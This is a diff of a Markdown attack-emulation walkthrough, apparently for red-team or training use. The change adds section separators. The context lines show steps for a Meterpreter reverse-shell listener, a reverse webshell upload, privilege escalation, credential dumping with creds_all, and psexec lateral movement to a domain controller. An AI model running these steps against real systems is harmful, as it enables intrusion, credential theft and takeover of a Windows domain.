@@ -42,6 +42,8 @@ On the `Attack Platform`:
 msfconsole -q -x 'use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <ip_attacker>;set lport 4444;run'
 ```
 
+---
+
 ### Step 1 - Initial Access <a name="step1"></a>
 
 The scenario begins when attacker successfully upload a reverse webshell `session.aspx` to the target's webserver. <br>
@@ -65,6 +67,7 @@ On the `Attack Platform`:
 
 2. Now on `Terminal 1` there should be a meterpreter session
 
+---
 
 ### Step 2  - Privilege Escalation <a name="step2"></a>
 
@@ -83,6 +86,8 @@ set SESSION 1
 exploit
 
 ```
+
+---
 
 ### Step 3  - Credentials Dumping <a name="step3"></a>
 
@@ -109,6 +114,8 @@ creds_all
 
 2.  Collect `<user_admin>`, `<pass_admin>` and `<domain>` 
 
+---
+
 ### Step 4 - Domain Discovery <a name="step4"></a>
 
 The attacker use `nslookup` on `<domain>` to get the domain controller's name `<name_ad>`
@@ -133,6 +140,8 @@ nslookup <domain>
 ```
 exit
 ```
+
+---
 
 ### Step 5 - Lateral Movement <a name="step5"></a>
 
@@ -180,5 +189,3 @@ psexec.exe \\<name_ad> -i -h -u <user_admin> -p <pass_admin> -accepteula -d -c s
 
 3.  Now `Terminal 2` should receive a connection back from `AD Server` with local admin privilege
 
-
-## III. Cited Intelligence
